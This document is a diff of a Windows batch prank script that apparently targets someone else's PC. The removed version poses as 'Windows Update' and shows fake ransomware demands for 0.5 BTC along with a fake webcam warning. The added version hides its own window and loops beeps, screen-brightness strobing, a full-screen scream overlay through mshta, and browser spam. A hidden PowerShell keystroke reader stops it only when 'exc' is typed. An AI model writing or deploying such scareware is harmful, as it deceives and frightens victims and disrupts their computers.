@@ -1,35 +1,38 @@
 @echo off
-title Windows Update
-color 0c
-
-:: This trick hides the black command prompt window immediately
+title Windows Security Breach
+:: Hide the main window instantly
 if not "%~1"=="hidden" (
-    powershell -window hidden -command "& '%~f0' hidden"
-    exit /b
+    echo CreateObject("Wscript.Shell").Run "cmd /c ""%~f0"" hidden", 0, False > "%temp%\h.vbs"
+    wscript "%temp%\h.vbs"
+    del "%temp%\h.vbs"
+    exit
 )
 
-:: 1. Text to Speech (Pasha's warning)
-powershell -c "Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Rate = -2; $s.Speak('Pasha has hacked your PC. Your files are being encrypted. Pay for his joints.')"
+:: 1. Start the loud banging noise (PowerShell background loop)
+start /b powershell -window hidden -c "while($true) { [console]::beep(100, 300); [console]::beep(150, 200) }"
 
-:: 2. Play a scary Windows system alarm sound
-powershell -c "(New-Object Media.SoundPlayer 'C:\Windows\Media\Alarm01.wav').PlaySync();"
+:: 2. Start the brightness flashing (PowerShell background loop)
+start /b powershell -window hidden -c "while($true) { (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, 100); Start-Sleep -m 200; (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, 0); Start-Sleep -m 200 }"
 
-:: 3. Download Hello Kitty and set it as the wallpaper
-powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ExcluseDev/scotty-sim/main/hello_kitty.png' -OutFile \"$env:TEMP\hk.png\""
-powershell -c "Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class W { [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [W]::SystemParametersInfo(20, 0, \"$env:TEMP\hk.png\", 3)"
+:: 3. Start the terrifying full-screen overlay (mshta) with your scary image
+:: REPLACE 'YOUR_SCARY_IMAGE_URL' WITH YOUR ACTUAL GITHUB RAW LINK
+start /b mshta "javascript:var s='<html><body style=background-color:black;margin:0;overflow:hidden;><img src=YOUR_SCARY_IMAGE_URL style=width:100vw;height:100vh;object-fit:cover;filter:brightness(0.5) contrast(2);><audio autoplay loop><source src=https://www.myinstants.com/media/sounds/scream.mp3 type=audio/mpeg></audio></body></html>';document.write(s);window.moveTo(0,0);window.resizeTo(screen.width,screen.height);"
 
-:: 4. The infinite loop of terror
-:loop
-:: Open the YouTube video
+:: 4. Open the NEW video EXACTLY ONCE
+start "" "https://www.youtube.com/watch?v=UMWyh0VilWk"
+
+:: 5. The Browser Spam Loop
+:spam
+:: Open the original Scottys video in different browsers
+start "" msedge "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
+start "" chrome "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
+start "" firefox "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
 start "" "https://www.youtube.com/watch?v=BIaMFvNbShE&t=1s"
 
-:: Spam native Windows error popups
-msg * "CRITICAL ERROR: Your files are encrypted by Pasha."
-msg * "WEBCAM ACTIVATED. RECORDING IN PROGRESS."
-msg * "PAY 0.5 BTC FOR PASHA'S JOINTS TO RECOVER FILES."
+:: 6. The Keylogger Escape Hatch (Watches for 'exc')
+:: We run this in a separate background thread so it doesn't block the spam loop
+start /b powershell -window hidden -c "$seq=''; while($true) { $key = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); if ($key.Character -match '[a-z]') { $seq += $key.Character; if ($seq.Length -gt 3) { $seq = $seq.Substring(1) }; if ($seq -eq 'exc') { taskkill /F /IM mshta.exe; taskkill /F /IM powershell.exe; taskkill /F /IM cmd.exe; exit } } }"
 
-:: Wait 2 seconds before doing it again
-timeout /t 2 /nobreak >nul
-
-:: Loop back to the top
-goto loop
+:: Wait 1 second and loop back to spam more
+timeout /t 1 /nobreak >nul
+goto spam
